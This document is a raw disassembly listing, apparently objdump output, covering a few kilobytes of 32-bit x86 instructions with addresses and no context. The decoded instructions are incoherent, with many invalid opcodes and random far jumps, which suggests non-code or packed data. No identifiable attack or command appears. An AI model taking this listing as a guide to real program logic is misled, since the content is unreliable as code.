  420c52:	les    ebp,FWORD PTR [ebx+0x4e]
  420c55:	test   BYTE PTR [eax+0x75973920],bl
  420c5b:	push   0xffffff9b
  420c5d:	fnstsw WORD PTR [ebx+0x3]
  420c60:	scas   eax,DWORD PTR es:[edi]
  420c61:	cmc    
  420c62:	bound  ebx,QWORD PTR ds:0xeca5d1c0
  420c68:	pop    ss
  420c69:	and    al,ah
  420c6b:	or     BYTE PTR [ebx-0x7a617d95],bl
  420c71:	es inc edi
  420c73:	mov    fs,esi
  420c75:	jmp    0x295e645a
  420c7a:	cdq    
  420c7b:	mov    esi,0xbeae0623
  420c80:	lock sbb BYTE PTR [edx+0x69],dh
  420c84:	jp     0x420c12
  420c86:	xor    bh,BYTE PTR [edx]
  420c88:	mov    edi,0x75e60bd5
  420c8d:	adc    dl,BYTE PTR [edx-0x5b]
  420c90:	mov    bh,0xc9
  420c92:	mov    ds:0xf8f54af1,al
  420c97:	lods   eax,DWORD PTR ds:[esi]
  420c98:	xor    eax,0x7e348424
  420c9d:	aam    0x3
  420c9f:	mov    ebp,0xe3ed2746
  420ca4:	and    BYTE PTR [eax-0x47468dc4],0x5f
  420cab:	mov    ah,0x22
  420cad:	jle    0x420c58
  420caf:	pop    edi
  420cb0:	sbb    eax,0xc9f317b9
  420cb5:	add    BYTE PTR [ecx+0x763354c8],ch
  420cbb:	xor    DWORD PTR [ecx+0x3e],ebp
  420cbe:	add    al,BYTE PTR [ecx-0x4b947414]
  420cc4:	xchg   ebx,eax
  420cc5:	lods   al,BYTE PTR ds:[esi]
  420cc6:	sbb    bh,ch
  420cc8:	push   0x6c
  420cca:	mov    ebx,ebp
  420ccc:	jno    0x420cff
  420cce:	les    ebp,FWORD PTR [eax]
  420cd0:	cmp    BYTE PTR ds:0x6bcfc83f,ch
  420cd6:	dec    edi
  420cd7:	jae    0x420d04
  420cd9:	mov    ds:0xaa81593,eax
  420cde:	pop    esi
  420cdf:	mov    dh,ah
  420ce1:	pop    edi
  420ce2:	jmp    0x420d5e
  420ce4:	repnz les esi,FWORD PTR [eax]
  420ce7:	sbb    BYTE PTR [esi+0x2af0a473],cl
  420ced:	lahf   
  420cee:	pushf  
  420cef:	(bad)  
  420cf0:	cs cmc 
  420cf2:	test   BYTE PTR [edi-0x49],bl
  420cf5:	in     eax,0xc1
  420cf7:	add    bp,WORD PTR [ebp-0x4]
  420cfb:	aam    0xea
  420cfd:	xchg   BYTE PTR [eax+ecx*4],cl
  420d00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d01:	push   ebp
  420d02:	push   ebx
  420d03:	(bad)  
  420d04:	rol    dh,1
  420d06:	std    
  420d07:	ficom  DWORD PTR [edi]
  420d09:	dec    esi
  420d0a:	cmp    BYTE PTR [edx+0x18016961],al
  420d10:	cmp    BYTE PTR [ebx+0x577699f0],dh
  420d16:	mov    eax,DWORD PTR [ebx-0x1644e9f9]
  420d1c:	aam    0x7
  420d1e:	repz sub BYTE PTR [eax],ch
  420d21:	fcomi  st,st(1)
  420d23:	mov    eax,0xcf050910
  420d28:	shl    BYTE PTR [edx+0x7af31032],cl
  420d2e:	sbb    eax,0xd24670e2
  420d33:	aam    0x42
  420d35:	cmp    BYTE PTR [edi],ch
  420d37:	pop    edi
  420d38:	gs push esp
  420d3a:	add    BYTE PTR ds:[ebp+0x19],dl
  420d3e:	add    DWORD PTR ds:0xcfb1c3da,esp
  420d44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d45:	addr16 repnz mov esi,0x5f9e4484
  420d4c:	mov    ?,WORD PTR [edi+0x63]
  420d4f:	bnd jne 0x420dbc
  420d52:	mov    ebp,0xe6bd0730
  420d57:	sub    al,0x33
  420d59:	sbb    ch,bh
  420d5b:	data16 jge 0x420d01
  420d5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d5f:	dec    edi
  420d60:	mov    al,0xe9
  420d62:	jno    0x420d71
  420d64:	outs   dx,DWORD PTR ds:[esi]
  420d65:	pop    ss
  420d66:	add    BYTE PTR [eax+0x30],al
  420d69:	ja     0x420d46
  420d6b:	push   cs
  420d6c:	leave  
  420d6d:	jns    0x420d53
  420d6f:	mov    WORD PTR [ecx-0x2c],ss
  420d72:	repnz cmc 
  420d74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d75:	inc    eax
  420d76:	pop    bp
  420d78:	js     0x420d02
  420d7a:	imul   ebx,DWORD PTR [ebx],0xffffffef
  420d7d:	imul   edx,DWORD PTR [ebp+0x46],0xffffff8f
  420d81:	hlt    
  420d82:	mov    edx,ebp
  420d84:	imul   esi,DWORD PTR [eax+0x16],0x49
  420d88:	or     DWORD PTR [bp+0x7ea0],0x33
  420d8e:	or     bh,BYTE PTR [eax-0x1ae18146]
  420d94:	sbb    al,0x1e
  420d96:	xor    BYTE PTR [eax*1-0x7d9c5b32],al
  420d9d:	rcr    BYTE PTR [esi+0x2f022f54],cl
  420da3:	xchg   DWORD PTR [esi+0x712790b3],ebx
  420da9:	jp     0x420d39
  420dab:	mov    dh,0x4e
  420dad:	scas   eax,DWORD PTR es:[edi]
  420dae:	sahf   
  420daf:	or     cl,BYTE PTR [ebx-0x17]
  420db2:	push   cs
  420db3:	mov    ds:0x1e3cb315,eax
  420db8:	inc    edi
  420db9:	push   ds
  420dba:	mov    bh,BYTE PTR [esi+0x23]
  420dbd:	pusha  
  420dbe:	sub    al,BYTE PTR [ebx]
  420dc0:	sub    DWORD PTR [ebx+0x3a1df9e0],ebx
  420dc6:	out    0xa7,al
  420dc8:	dec    esi
  420dc9:	bound  ebx,QWORD PTR [edi]
  420dcb:	je     0x420dc4
  420dcd:	lock mov ecx,0xaacbe112
  420dd3:	fsub   DWORD PTR [edi-0x4d]
  420dd6:	inc    esp
  420dd7:	sub    eax,0xae1dce84
  420ddc:	jbe    0x420e5d
  420dde:	pusha  
  420ddf:	mov    esp,0x5199c12b
  420de4:	sub    ah,cl
  420de6:	fbstp  TBYTE PTR [esi-0x32]
  420de9:	(bad)  
  420dea:	aaa    
  420deb:	pop    ebx
  420dec:	sub    ah,BYTE PTR [esi+0x12]
  420def:	dec    esi
  420df0:	dec    edi
  420df1:	stos   BYTE PTR es:[edi],al
  420df2:	adc    ebp,esi
  420df4:	mov    eax,0xb817722c
  420df9:	inc    eax
  420dfa:	call   0x5cd2504a
  420dff:	sbb    al,0xf9
  420e01:	and    al,0x7b
  420e03:	into   
  420e04:	retf   0xd27c
  420e07:	push   cs
  420e08:	ins    BYTE PTR es:[edi],dx
  420e09:	sub    cl,BYTE PTR [edi+0x3fd2c4ad]
  420e0f:	(bad)  
  420e10:	xlat   BYTE PTR ds:[ebx]
  420e11:	cmp    al,0xa2
  420e13:	mov    ebp,0x618bea46
  420e18:	fst    DWORD PTR [esi+0x49110d67]
  420e1e:	aam    0xb0
  420e20:	jge    0x420db4
  420e22:	js     0x420e22
  420e24:	mov    al,0x1b
  420e26:	mov    DWORD PTR ds:0xa20aa008,edi
  420e2c:	popa   
  420e2d:	or     ecx,DWORD PTR [ecx+0x7]
  420e30:	xlat   BYTE PTR es:[ebx]
  420e32:	cwde   
  420e33:	mov    WORD PTR [ebx-0x51743252],?
  420e39:	sbb    eax,0xd1acfe14
  420e3e:	test   DWORD PTR [edi+edx*1+0x3125d84d],esi
  420e45:	push   0xffe0d81
  420e4a:	test   eax,0xe9756318
  420e4f:	jne    0x420e05
  420e51:	inc    ecx
  420e52:	(bad)  
  420e53:	mov    ds:0xab97aa2c,eax
  420e58:	es in  eax,0x6e
  420e5b:	scas   eax,DWORD PTR es:[edi]
  420e5c:	pop    ss
  420e5d:	mov    BYTE PTR [edi-0x1f],cl
  420e60:	xchg   esi,eax
  420e61:	mov    eax,0x6a99683d
  420e66:	and    ah,BYTE PTR [esi]
  420e68:	scas   al,BYTE PTR es:[edi]
  420e69:	fldpi  
  420e6b:	cdq    
  420e6c:	or     eax,DWORD PTR [esi-0x320ba7b9]
  420e72:	mov    dh,dh
  420e74:	stos   BYTE PTR es:[edi],al
  420e75:	push   edi
  420e76:	scas   eax,DWORD PTR es:[edi]
  420e77:	push   ecx
  420e78:	jo     0x420e9f
  420e7a:	inc    esp
  420e7b:	lea    edx,[eax]
  420e7d:	sti    
  420e7e:	add    edi,DWORD PTR [edx]
  420e80:	and    dh,BYTE PTR ds:0xdbde7254
  420e86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e87:	xor    ah,BYTE PTR [edi-0xe]
  420e8a:	in     al,0xe8
  420e8c:	mov    dl,0x6e
  420e8e:	loope  0x420e89
  420e90:	scas   eax,DWORD PTR es:[edi]
  420e91:	sbb    ch,BYTE PTR [edi+0x76]
  420e94:	(bad)  
  420e95:	or     esp,DWORD PTR [ecx]
  420e97:	mov    esi,0xed86e170
  420e9c:	(bad)  
  420e9d:	cdq    
  420e9e:	inc    edi
  420e9f:	push   edx
  420ea0:	jns    0x420ec8
  420ea2:	aas    
  420ea3:	arpl   WORD PTR [ebx+0x74],si
  420ea6:	xchg   esp,eax
  420ea7:	out    0xbd,eax
  420ea9:	iret   
  420eaa:	xchg   esi,eax
  420eab:	call   0x58d837e0
  420eb0:	xchg   ebp,eax
  420eb1:	mov    ch,0x11
  420eb3:	dec    esi
  420eb4:	cmp    ch,BYTE PTR [edx]
  420eb6:	pop    ebp
  420eb7:	scas   al,BYTE PTR es:[edi]
  420eb8:	adc    DWORD PTR [eax-0xd7b9509],esi
  420ebe:	adc    DWORD PTR [edi+0x5b7bc5aa],esi
  420ec4:	jae    0x420ee2
  420ec6:	mov    edx,DWORD PTR [ecx]
  420ec8:	enter  0xc040,0xba
  420ecc:	fwait
  420ecd:	popa   
  420ece:	gs fcomp DWORD PTR ds:[ebp-0x2c74b867]
  420ed6:	xor    BYTE PTR [edx],al
  420ed8:	mov    al,al
  420eda:	add    ch,BYTE PTR [ebp+eiz*2+0x661de0b2]
  420ee1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ee2:	pop    edi
  420ee3:	into   
  420ee4:	adc    bl,BYTE PTR [edx-0x60fffe0e]
  420eea:	add    BYTE PTR [ebx-0x7c],bh
  420eed:	outs   dx,BYTE PTR ds:[esi]
  420eee:	or     ch,BYTE PTR [ecx-0x5e]
  420ef1:	add    DWORD PTR [edx-0x66],0x72c71e94
  420ef8:	or     BYTE PTR [edi+eax*8-0x1b],dh
  420efc:	cdq    
  420efd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420efe:	aaa    
  420eff:	mov    edi,0x3b7009c5
  420f04:	lock or al,0x4c
  420f07:	jne    0x420f09
  420f09:	sub    DWORD PTR [ecx+0x51],0x14
  420f0d:	mov    bh,0x7f
  420f0f:	fimul  DWORD PTR [edx+eax*2-0x3d]
  420f13:	pop    ebx
  420f14:	js     0x420ecb
  420f16:	xor    eax,0x676a3192
  420f1b:	inc    ebp
  420f1c:	call   0x3e69:0xd5bca43c
  420f23:	(bad)  
  420f24:	and    bl,bl
  420f26:	ss add al,0x7b
  420f29:	and    BYTE PTR ds:0xfa6e02f2,cl
  420f2f:	sar    BYTE PTR [eax],1
  420f31:	inc    ebp
  420f32:	mov    DWORD PTR [ecx-0x6e6b0d94],ecx
  420f38:	addr16 jo 0x420eea
  420f3b:	or     esp,DWORD PTR [esi+0x7fbfefe2]
  420f41:	test   ecx,edx
  420f43:	std    
  420f44:	in     al,0x9
  420f46:	pop    esi
  420f47:	lea    esp,[esp+ebp*8]
  420f4a:	pop    edx
  420f4b:	pop    ecx
  420f4c:	hlt    
  420f4d:	test   eax,0x4bca544f
  420f52:	pushf  
  420f53:	pop    edi
  420f54:	cdq    
  420f55:	mov    al,0x5c
  420f57:	icebp  
  420f58:	sbb    bh,ch
  420f5a:	push   0x9216202e
  420f5f:	sahf   
  420f60:	imul   edx,DWORD PTR [edi-0x5a01046c],0x394a49ef
  420f6a:	lds    ebp,FWORD PTR [ecx-0x2d]
  420f6d:	jae    0x420fbf
  420f6f:	jo     0x420f3e
  420f71:	out    0xc9,al
  420f73:	inc    edx
  420f74:	sbb    ah,BYTE PTR [edx+esi*8]
  420f77:	ja     0x420f3d
  420f79:	ds (bad) 
  420f7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f7c:	mov    eax,0x6b536878
  420f81:	push   es
  420f82:	xchg   esi,eax
  420f83:	push   ds
  420f84:	cmp    BYTE PTR [ebp+0x7c],bh
  420f87:	sbb    esp,DWORD PTR [ecx]
  420f89:	sub    edx,ebx
  420f8b:	push   ebx
  420f8c:	out    0x14,eax
  420f8e:	out    0xd7,eax
  420f90:	ins    DWORD PTR es:[edi],dx
  420f91:	adc    eax,0xb02ff453
  420f96:	(bad)  
  420f97:	iret   
  420f98:	popa   
  420f99:	cli    
  420f9a:	jo     0x420fa4
  420f9c:	xchg   BYTE PTR ds:0x4c14977f,al
  420fa2:	xlat   BYTE PTR ds:[ebx]
  420fa3:	cmp    esi,DWORD PTR [edi+0x55]
  420fa6:	prefetch BYTE PTR [edx-0x219fb5ff]
  420fad:	sub    DWORD PTR [ebx-0x7ee1df2c],ebp
  420fb3:	push   0x42
  420fb5:	sti    
  420fb6:	mov    esi,0xb331e769
  420fbb:	clc    
  420fbc:	(bad)  
  420fbd:	pop    ecx
  420fbe:	add    BYTE PTR [esi-0x2539f80],cl
  420fc4:	sub    eax,DWORD PTR [esi+0x3a]
  420fc7:	xor    ecx,DWORD PTR [edi+0x6b36e014]
  420fcd:	sahf   
  420fce:	clc    
  420fcf:	leave  
  420fd0:	aad    0xef
  420fd2:	fisub  WORD PTR [eax]
  420fd4:	stos   BYTE PTR es:[edi],al
  420fd5:	in     al,0x94
  420fd7:	mov    ah,0xa1
  420fd9:	and    edx,edx
  420fdb:	mov    bl,0xb9
  420fdd:	push   ss
  420fde:	sbb    eax,0xf24e4320
  420fe3:	call   0xc498bab1
  420fe8:	leave  
  420fe9:	adc    dh,0xfc
  420fec:	cmc    
  420fed:	or     bl,ah
  420fef:	push   esp
  420ff0:	(bad)  
  420ff1:	shl    eax,1
  420ff3:	and    al,0x48
  420ff5:	xor    DWORD PTR [ecx+0x8],ebx
  420ff8:	xor    ax,0x106f
  420ffc:	sti    
  420ffd:	nop
  420ffe:	push   ds
  420fff:	push   es
  421000:	std    
  421001:	in     al,0x23
  421003:	test   DWORD PTR [edi+edx*1+0x49],eax
  421007:	dec    ebx
  421008:	mov    ebp,0xf9c8ac0d
  42100d:	retf   0xdea4
  421010:	or     BYTE PTR [eax+esi*2+0x78],0x72
  421015:	imul   BYTE PTR [edi+0x368a38ad]
  42101b:	xchg   DWORD PTR [edi],ecx
  42101d:	mov    eax,ds:0x3d1b6e55
  421022:	cmp    ecx,eax
  421024:	adc    BYTE PTR [di-0x75],dl
  421028:	jmp    0x6394ffae
  42102d:	pop    edi
  42102e:	jns    0x421019
  421030:	addr16 pop es
  421032:	rcl    esp,cl
  421034:	jmp    0x420fda
  421036:	jmp    0x3cc82a2c
  42103b:	hlt    
  42103c:	mov    edx,0x9909e68a
  421041:	cwde   
  421042:	sub    DWORD PTR [edi-0xb],0x62
  421046:	mov    bl,BYTE PTR [edx+esi*4-0xdfb2cf6]
  42104d:	mov    ?,ebp
  42104f:	xor    esp,DWORD PTR [edi]
  421051:	and    ebx,DWORD PTR [edi+0x2ac6ccb1]
  421057:	or     BYTE PTR [edi+0x4ae0d3d5],ch
  42105d:	mov    dh,0x7e
  42105f:	or     al,0x21
  421061:	retf   
  421062:	lods   eax,DWORD PTR ds:[esi]
  421063:	out    0x0,eax
  421065:	cmp    eax,0x821baee0
  42106a:	cmp    DWORD PTR [eax],edi
  42106c:	add    DWORD PTR [edx+0x65fc99bb],edi
  421072:	push   eax
  421073:	dec    edi
  421074:	popa   
  421075:	sahf   
  421076:	push   0xc9099143
  42107b:	mov    ss,WORD PTR [edi+0x25]
  42107e:	mov    ds:0x3b8efebd,eax
  421083:	out    dx,eax
  421084:	jb     0x421071
  421086:	scas   al,BYTE PTR es:[edi]
  421087:	rep lods eax,DWORD PTR ds:[esi]
  421089:	jle    0x42105c
  42108b:	sbb    edx,DWORD PTR [ebp-0x11]
  42108e:	loope  0x42108d
  421090:	cmp    DWORD PTR [ecx+edi*1],ebx
  421093:	xchg   ebp,eax
  421095:	leave  
  421096:	xor    eax,0xa1a1dea1
  42109b:	xor    BYTE PTR [ecx],al
  42109d:	xchg   esp,eax
  42109e:	rol    edx,cl
  4210a0:	mov    esp,0xc0949738
  4210a5:	imul   ebx,DWORD PTR [ecx+0x2609b0fe],0xfffffffd
  4210ac:	mov    al,0xd1
  4210ae:	adc    eax,0xfb34b29a
  4210b3:	jg     0x42103c
  4210b5:	(bad)
  4210ba:	cmp    bh,BYTE PTR [edx+ebp*8+0x699e57df]
  4210c1:	dec    DWORD PTR [eax]
  4210c3:	jl     0x421071
  4210c5:	inc    ecx
  4210c6:	mov    ds:0xb533776d,al
  4210cb:	loop   0x4210c2
  4210cd:	inc    ebx
  4210ce:	push   ecx
  4210cf:	ret    0xae2a
  4210d2:	stc    
  4210d3:	test   al,0x8b
  4210d5:	or     edi,eax
  4210d7:	mov    ?,WORD PTR [eax+ecx*2-0x45a28e23]
  4210de:	mov    dh,0xfa
  4210e0:	dec    esp
  4210e1:	adc    eax,0x687955ab
  4210e6:	repz sub dh,BYTE PTR [ebp+ebp*4+0x48]
  4210eb:	mov    ebx,0xcfe250aa
  4210f0:	xchg   ebp,eax
  4210f1:	jns    0x4210af
  4210f3:	idiv   dh
  4210f5:	xchg   DWORD PTR [ecx-0x5bcbcd4],eax
  4210fb:	rcl    BYTE PTR [eax],1
  4210fd:	retf   
  4210fe:	and    BYTE PTR [ebp+0x24],bl
  421101:	or     bl,dh
  421103:	mov    ch,BYTE PTR [edi+0x78]
  421106:	or     al,0x0
  421108:	mov    edi,0x8ca4b461
  42110d:	(bad)  
  42110e:	test   eax,0x91634950
  421113:	sub    BYTE PTR [ecx+0x3b],dl
  421116:	mov    ds:0xdb38f6dc,eax
  42111b:	daa    
  42111c:	mov    ecx,0x3d708eae
  421121:	ss lock addr16 dec esi
  421125:	(bad)  
  421126:	fnstcw WORD PTR [ecx+0x71]
  421129:	mov    al,ds:0x216fb0ff
  42112e:	iret   
  42112f:	in     eax,0x7f
  421131:	pop    edi
  421132:	mov    eax,0xff0fc39
  421137:	and    DWORD PTR [ebp-0xef90a26],edx
  42113d:	mov    BYTE PTR [ebx+0x3471f075],bh
  421143:	jo     0x42113b
  421145:	leave  
  421146:	mov    ebx,0x174e4d42
  42114b:	arpl   WORD PTR [ebx],di
  42114d:	mov    al,0x71
  42114f:	sbb    BYTE PTR [ecx-0x41a2f396],0x34
  421156:	call   0xcb003bf9
  42115b:	pop    edi
  42115c:	rol    BYTE PTR [esp+ebx*1-0x20e9034e],cl
  421163:	add    DWORD PTR [ebx+0x1f7a82],edx
  421169:	mov    edi,0xbedd2125
  42116f:	or     eax,0xc6d98d7d
  421174:	cs sbb al,ah
  421177:	sar    BYTE PTR [ebp-0x37],cl
  42117a:	nop
  42117b:	(bad)  
  42117c:	mov    ebp,0x7b7eef9a
  421181:	lods   eax,DWORD PTR ds:[esi]
  421182:	ja     0x4211dc
  421184:	xor    DWORD PTR [ebx-0x34],ebx
  421187:	nop
  421188:	mov    al,0x77
  42118a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42118b:	pushf  
  42118c:	cmp    bl,bl
  42118e:	ret    0xa6f7
  421191:	retf   0x589e
  421194:	sbb    bh,bl
  421196:	leave  
  421197:	ins    BYTE PTR es:[edi],dx
  421198:	xchg   ecx,eax
  421199:	xlat   BYTE PTR ds:[ebx]
  42119a:	xchg   edi,eax
  42119b:	sub    bl,ch
  42119d:	xor    DWORD PTR [edx-0x43],eax
  4211a0:	jp     0x42120a
  4211a2:	and    BYTE PTR [ebx-0x695acbf1],bh
  4211a8:	into   
  4211a9:	test   BYTE PTR [edx+eiz*8-0x36],ch
  4211ad:	xlat   BYTE PTR gs:[ebx]
  4211af:	push   edx
  4211b0:	jb     0x42121f
  4211b2:	call   DWORD PTR [eax]
  4211b4:	pop    eax
  4211b5:	jns    0x4211e9
  4211b7:	sub    eax,0x30f37234
  4211bc:	inc    ebp
  4211bd:	loope  0x421159
  4211bf:	push   ecx
  4211c0:	cmp    al,0xad
  4211c2:	pop    eax
  4211c3:	push   esi
  4211c4:	xchg   ecx,eax
  4211c5:	ret    0xec9d
  4211c8:	jge    0x421234
  4211ca:	push   edx
  4211cc:	iret   
  4211cd:	fadd   DWORD PTR [edi+0x5b]
  4211d0:	jnp    0x421200
  4211d2:	dec    edx
  4211d3:	cmp    al,0xb7
  4211d5:	dec    esp
  4211d7:	cli    
  4211d8:	ins    DWORD PTR es:[edi],dx
  4211d9:	and    al,0xe0
  4211db:	or     bl,BYTE PTR ds:0x83d03c1
  4211e1:	adc    al,0x13
  4211e3:	jecxz  0x4211f1
  4211e5:	xor    ebx,0x1
  4211e8:	push   edi
  4211e9:	xor    esp,esi
  4211eb:	fldenv [eax+esi*1+0x8105bf6]
  4211f2:	mov    DWORD PTR [eax],edi
  4211f4:	mov    ebx,0xcafce56d
  4211f9:	or     DWORD PTR [edx],0x3
  4211fc:	scas   al,BYTE PTR es:[edi]
  4211fd:	push   esp
  4211fe:	in     al,dx
  4211ff:	jmp    0x879404e1
  421204:	xor    ecx,0x60
  421207:	push   ecx
  421208:	or     ch,BYTE PTR [edx+0x343b8fc9]
  42120e:	xchg   edx,eax
  42120f:	cld    
  421210:	push   ss
  421211:	stc    
  421212:	out    dx,al
  421213:	fsubrp st(5),st
  421215:	xchg   ebp,eax
  421216:	jl     0x42123a
  421218:	pop    ebx
  421219:	pop    eax
  42121a:	shl    ebx,1
  42121c:	inc    ebx
  42121d:	or     dl,dl
  42121f:	out    dx,eax
  421220:	mov    al,0x88
  421222:	sbb    DWORD PTR [edi+0x50],edx
  421225:	xchg   ebx,eax
  421226:	fldenv [esi+0x2c]
  421229:	test   BYTE PTR [eax],bl
  42122b:	sbb    ah,BYTE PTR [edi-0x19]
  42122e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42122f:	xor    BYTE PTR [edx-0x1dc5779],dh
  421235:	call   0x758f92f4
  42123a:	jecxz  0x421248
  42123c:	push   edx
  42123d:	push   0xebac2493
  421242:	pop    ss
  421243:	inc    ebx
  421244:	inc    edx
  421245:	test   eax,0x5b7d4ad3
  42124a:	rcr    DWORD PTR [eax],0xc1
  42124d:	mov    ah,0xee
  42124f:	adc    al,0x8b
  421251:	pop    ebx
  421252:	jns    0x421284
  421254:	pusha  
  421255:	out    dx,al
  421256:	xchg   esp,eax
  421257:	test   BYTE PTR [esi+0x45780a51],cl
  42125d:	inc    edi
  42125e:	test   al,0xf5
  421260:	ror    DWORD PTR [edx+0x6f00efe5],cl
  421266:	jmp    FWORD PTR [edx-0x62a20199]
  42126c:	nop
  42126d:	repz ret 
  42126f:	rol    BYTE PTR ds:0xb2b17f54,cl
  421275:	add    DWORD PTR [ebx+0x68],esp
  421278:	sub    ch,bl
  42127a:	xchg   edx,eax
  42127b:	sub    al,0x3f
  42127d:	std    
  42127e:	test   cl,al
  421280:	adc    DWORD PTR [ecx-0x69],ebp
  421283:	fwait
  421284:	mov    dh,0x66
  421286:	fidiv  DWORD PTR [edx+0x29]
  421289:	dec    edx
  42128a:	pusha  
  42128b:	mov    ecx,0x3bd170f3
  421290:	hlt    
  421291:	dec    esp
  421292:	mov    BYTE PTR [edi+eax*8-0x72c4ce2],ch
  421299:	jmp    FWORD PTR [eax+0xe]
  42129c:	sub    esp,DWORD PTR [esi-0x2d]
  42129f:	loope  0x4212f4
  4212a1:	xchg   esi,eax
  4212a2:	mul    DWORD PTR [esi+0x5044b212]
  4212a8:	imul   ebx,DWORD PTR [ebx+0xb70b15f],0x3e
  4212af:	call   0xbdd2f06f
  4212b4:	sub    edi,DWORD PTR [ebx]
  4212b6:	int3   
  4212b7:	sbb    al,0x1b
  4212b9:	aad    0x6f
  4212bb:	xchg   edx,eax
  4212bc:	sti    
  4212bd:	outs   dx,BYTE PTR ds:[esi]
  4212be:	(bad)  
  4212bf:	(bad)  
  4212c0:	cld    
  4212c1:	imul   edx,DWORD PTR [ecx],0x6e
  4212c4:	cmc    
  4212c5:	(bad)  
  4212c7:	mov    dl,0x49
  4212c9:	inc    eax
  4212ca:	push   0x10
  4212cc:	push   0xffffff9f
  4212ce:	call   0x28db:0x33a9a95d
  4212d5:	aas    
  4212d6:	inc    eax
  4212d7:	and    DWORD PTR [eax-0x44e126a6],edx
  4212dd:	popa   
  4212de:	cmp    ecx,esp
  4212e0:	nop
  4212e1:	inc    eax
  4212e2:	aaa    
  4212e3:	jne    0x42135c
  4212e5:	test   eax,0xfaa7d524
  4212ea:	pop    ebx
  4212eb:	dec    esp
  4212ec:	pushf  
  4212ed:	in     eax,dx
  4212ee:	dec    esp
  4212ef:	mov    ds:0x1ba69c8b,al
  4212f4:	test   al,0xe1
  4212f6:	test   BYTE PTR [ebx],ch
  4212f8:	ret    0xbfdd
  4212fb:	jmp    0x421352
  4212fd:	and    ebp,DWORD PTR [ecx]
  4212ff:	adc    ecx,DWORD PTR [esi-0x3d75616a]
  421305:	call   0xf9d0:0x6d43c293
  42130c:	repnz daa 
  42130e:	dec    ecx
  42130f:	cmp    DWORD PTR [edi],esi
  421311:	push   edi
  421312:	das    
  421313:	cmp    al,0x50
  421315:	and    ecx,esi
  421317:	jge    0x421387
  421319:	adc    al,0xe3
  42131b:	test   BYTE PTR [eax-0x62],bl
  42131e:	daa    
  42131f:	pop    ebx
  421320:	xchg   esp,eax
  421321:	addr16 dec edi
  421323:	out    dx,eax
  421324:	lock lods eax,DWORD PTR ds:[esi]
  421326:	je     0x4212dd
  421328:	mov    bh,0xe1
  42132a:	cld    
  42132b:	xor    BYTE PTR [ebp-0x6],bh
  42132e:	push   ds
  42132f:	fidiv  WORD PTR [edi]
  421331:	xor    dh,BYTE PTR [esi-0x40ab048]
  421337:	jb     0x42133a
  421339:	add    BYTE PTR [eax+0x289e352d],ah
  42133f:	add    esp,DWORD PTR [esi+0x0]
  421342:	push   cs
  421343:	push   ecx
  421344:	adc    dh,bl
  421346:	mov    al,ds:0x2d470e
  42134b:	and    BYTE PTR [ebp-0x67812b28],dh
  421351:	int3   
  421352:	fdivr  DWORD PTR [ebx-0x5c615253]
  421358:	jmp    0x4213d4
  42135a:	hlt    
  42135b:	jl     0x421389
  42135d:	call   0x3b8d4676
  421362:	icebp  
  421363:	jle    0x4213a2
  421365:	ins    DWORD PTR es:[edi],dx
  421366:	sti    
  421367:	push   esp
  421368:	jmp    0xdbcf:0x46b228d2
  42136f:	aam    0x9c
  421371:	test   DWORD PTR [esi],edx
  421373:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421374:	jmp    0x4fba:0xef02826e
  42137b:	or     ebx,ebx
  42137d:	test   eax,0x1c4d448d
  421382:	add    al,0x81
  421384:	inc    edi
  421385:	jl     0x4213b8
  421387:	push   0x12d86e5d
  42138c:	sub    esp,0x3e
  42138f:	mov    dh,0xcf
  421391:	js     0x421372
  421393:	inc    ecx
  421394:	mov    esp,0x983f28e5
  421399:	jno    0x4213aa
  42139b:	adc    al,0xb4
  42139d:	add    ebx,ebp
  42139f:	push   edx
  4213a0:	adc    esi,DWORD PTR [ecx-0x5afe3899]
  4213a6:	scas   al,BYTE PTR es:[edi]
  4213a7:	pop    ds
  4213a8:	or     edi,DWORD PTR [eax+esi*1]
  4213ab:	pop    ebx
  4213ac:	add    eax,0x83f37466
  4213b1:	pop    ds
  4213b2:	cmp    DWORD PTR [edi-0xc],0x12bf54fc
  4213b9:	adc    BYTE PTR [esi],cl
  4213bb:	push   eax
  4213bc:	or     DWORD PTR [esi+0x4e],ecx
  4213bf:	sbb    DWORD PTR [esi-0x2f69397c],ebx
  4213c5:	cli    
  4213c6:	ss jnp 0x421405
  4213c9:	xchg   ecx,eax
  4213ca:	in     al,0xdb
  4213cc:	xor    eax,0xe00fa7fb
  4213d1:	and    dl,0xf2
  4213d4:	push   edx
  4213d5:	jge    0x421410
  4213d7:	or     BYTE PTR [ecx-0x39],0xa8
  4213db:	cmp    eax,0xe57599a7
  4213e0:	ror    eax,1
  4213e2:	fcmovbe st,st(0)
  4213e4:	out    dx,al
  4213e5:	out    dx,eax
  4213e6:	adc    dl,BYTE PTR [ecx-0x34653490]
  4213ec:	mov    es,WORD PTR [esi-0x795bf12f]
  4213f2:	sbb    BYTE PTR [ebx+edx*1-0x2c],bl
  4213f6:	pop    ss
  4213f7:	mov    bh,0xe6
  4213f9:	push   edi
  4213fa:	sti    
  4213fb:	xor    cl,ch
  4213fd:	sbb    eax,0x7670c177
  421402:	popa   
  421403:	jle    0x421481
  421405:	ins    DWORD PTR es:[edi],dx
  421406:	xchg   ebp,eax
  421407:	bound  ecx,QWORD PTR [esi]
  421409:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42140a:	mov    al,ds:0xccd754e
  42140f:	sbb    al,BYTE PTR ds:0xcd887274
  421415:	mov    dl,0x94
  421417:	stos   BYTE PTR es:[edi],al
  421418:	sti    
  421419:	inc    edx
  42141a:	outs   dx,BYTE PTR ds:[esi]
  42141b:	sbb    al,0xa8
  42141d:	int3   
  42141e:	pop    edx
  42141f:	or     DWORD PTR [ebp-0x5ab186df],esp
  421425:	test   DWORD PTR [ebp-0x59],esi
  421428:	popf   
  421429:	(bad)  [esi-0x5a73ffe9]
  42142f:	jae    0x4213e8
  421431:	xor    cl,BYTE PTR [esi-0x6]
  421434:	jb     0x42141f
  421436:	jmp    0xf065:0xf62a791a
